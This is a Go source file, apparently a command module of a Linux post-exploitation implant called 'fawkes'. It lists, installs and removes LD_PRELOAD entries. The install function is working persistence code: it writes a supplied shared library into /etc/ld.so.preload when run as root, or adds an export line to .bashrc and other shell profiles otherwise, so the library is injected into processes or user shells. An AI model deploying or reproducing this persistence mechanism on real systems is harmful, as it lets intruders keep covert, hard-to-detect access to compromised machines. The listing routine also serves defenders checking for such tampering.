//go:build linux && amd64

package commands

import (
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type ldPreloadArgs struct {
	Action  string `json:"action"`  // list, install, remove
	LibPath string `json:"libpath"` // Path to shared library
	Target  string `json:"target"`  // Profile target: bashrc, profile, zshrc, ld.so.preload (default: auto)
}

// ldPreloadList enumerates current LD_PRELOAD settings from all sources.
func ldPreloadList() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("LD_PRELOAD Configuration\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	// Check /etc/ld.so.preload (system-wide, root-managed)
	sb.WriteString("[System] /etc/ld.so.preload:\n")
	if data, err := os.ReadFile("/etc/ld.so.preload"); err == nil {
		content := strings.TrimSpace(string(data))
		if content == "" {
			sb.WriteString("  (empty)\n")
		} else {
			for _, line := range strings.Split(content, "\n") {
				line = strings.TrimSpace(line)
				if line != "" && !strings.HasPrefix(line, "#") {
					sb.WriteString(fmt.Sprintf("  → %s\n", line))
				}
			}
		}
	} else {
		sb.WriteString("  (not found or unreadable)\n")
	}

	// Check LD_PRELOAD environment variable
	sb.WriteString(fmt.Sprintf("\n[Environment] LD_PRELOAD=%s\n", os.Getenv("LD_PRELOAD")))

	// Check shell profile files for LD_PRELOAD exports
	sb.WriteString("\n[Shell Profiles]\n")
	home, _ := os.UserHomeDir()
	profiles := []string{
		filepath.Join(home, ".bashrc"),
		filepath.Join(home, ".bash_profile"),
		filepath.Join(home, ".profile"),
		filepath.Join(home, ".zshrc"),
		filepath.Join(home, ".zshenv"),
	}

	for _, p := range profiles {
		data, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(data), "\n") {
			trimmed := strings.TrimSpace(line)
			if strings.Contains(trimmed, "LD_PRELOAD") && !strings.HasPrefix(trimmed, "#") {
				sb.WriteString(fmt.Sprintf("  %s: %s\n", filepath.Base(p), trimmed))
			}
		}
	}

	return successResult(sb.String())
}

// ldPreloadInstall installs an LD_PRELOAD entry for persistence.
func ldPreloadInstall(args ldPreloadArgs) structs.CommandResult {
	if args.LibPath == "" {
		return errorResult("Error: libpath parameter required (path to shared library)")
	}

	// Validate library exists
	if _, err := os.Stat(args.LibPath); os.IsNotExist(err) {
		return errorf("Error: library not found at %s", args.LibPath)
	}

	target := strings.ToLower(args.Target)
	if target == "" {
		target = "auto"
	}

	// Auto-select: root uses ld.so.preload, user uses .bashrc
	if target == "auto" {
		u, _ := user.Current()
		if u != nil && u.Uid == "0" {
			target = "ld.so.preload"
		} else {
			target = "bashrc"
		}
	}

	var targetPath string
	var content string

	switch target {
	case "ld.so.preload":
		targetPath = "/etc/ld.so.preload"
		// Append library path to ld.so.preload
		existing, _ := os.ReadFile(targetPath)
		existingStr := strings.TrimSpace(string(existing))
		if strings.Contains(existingStr, args.LibPath) {
			return errorf("Library %s already in %s", args.LibPath, targetPath)
		}
		if existingStr != "" {
			content = existingStr + "\n" + args.LibPath + "\n"
		} else {
			content = args.LibPath + "\n"
		}

	case "bashrc", "bash_profile", "profile", "zshrc", "zshenv":
		home, _ := os.UserHomeDir()
		dotPrefix := "." + target
		targetPath = filepath.Join(home, dotPrefix)
		exportLine := fmt.Sprintf("export LD_PRELOAD=%s", args.LibPath)

		existing, _ := os.ReadFile(targetPath)
		existingStr := string(existing)
		if strings.Contains(existingStr, args.LibPath) {
			return errorf("Library %s already in %s", args.LibPath, targetPath)
		}
		content = existingStr + "\n" + exportLine + "\n"

	default:
		return errorf("Unknown target: %s (use: ld.so.preload, bashrc, profile, zshrc, zshenv, or auto)", target)
	}

	if err := os.WriteFile(targetPath, []byte(content), 0644); err != nil {
		return errorf("Failed to write %s: %v", targetPath, err)
	}

	return successf("LD_PRELOAD persistence installed:\n  Library: %s\n  Target: %s\n  Method: %s", args.LibPath, targetPath, target)
}

// ldPreloadRemove removes an LD_PRELOAD entry from a target file.
func ldPreloadRemove(args ldPreloadArgs) structs.CommandResult {
	if args.LibPath == "" {
		return errorResult("Error: libpath parameter required")
	}

	target := strings.ToLower(args.Target)
	if target == "" {
		target = "auto"
	}

	// Build list of files to check
	var filesToCheck []string

	if target == "auto" || target == "ld.so.preload" {
		filesToCheck = append(filesToCheck, "/etc/ld.so.preload")
	}

	home, _ := os.UserHomeDir()
	profileTargets := []string{"bashrc", "bash_profile", "profile", "zshrc", "zshenv"}

	if target == "auto" {
		for _, p := range profileTargets {
			filesToCheck = append(filesToCheck, filepath.Join(home, "."+p))
		}
	} else {
		for _, p := range profileTargets {
			if target == p {
				filesToCheck = append(filesToCheck, filepath.Join(home, "."+p))
			}
		}
	}

	removed := 0
	var sb strings.Builder

	for _, fpath := range filesToCheck {
		data, err := os.ReadFile(fpath)
		if err != nil {
			continue
		}

		lines := strings.Split(string(data), "\n")
		var newLines []string
		found := false

		for _, line := range lines {
			if strings.Contains(line, args.LibPath) {
				found = true
				sb.WriteString(fmt.Sprintf("  Removed from %s: %s\n", filepath.Base(fpath), strings.TrimSpace(line)))
				continue
			}
			newLines = append(newLines, line)
		}

		if found {
			if err := os.WriteFile(fpath, []byte(strings.Join(newLines, "\n")), 0644); err != nil {
				sb.WriteString(fmt.Sprintf("  Error writing %s: %v\n", fpath, err))
			} else {
				removed++
			}
		}
	}

	if removed == 0 {
		return errorf("Library %s not found in any checked files", args.LibPath)
	}

	return successf("LD_PRELOAD entries removed (%d files modified):\n%s", removed, sb.String())
}
